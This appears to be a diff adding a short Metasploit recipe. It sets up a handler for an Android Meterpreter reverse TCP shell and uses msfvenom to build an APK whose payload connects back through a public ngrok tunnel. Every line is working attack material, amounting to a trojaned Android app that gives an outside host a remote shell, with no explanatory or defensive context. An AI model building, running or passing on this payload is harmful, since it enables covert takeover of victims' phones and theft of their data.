@@ -1,0 +1,9 @@
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+show options
+set LHOST localhost
+set LPORT 4444
+exploit
+
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=11752 R > ngroksonyyy.apk
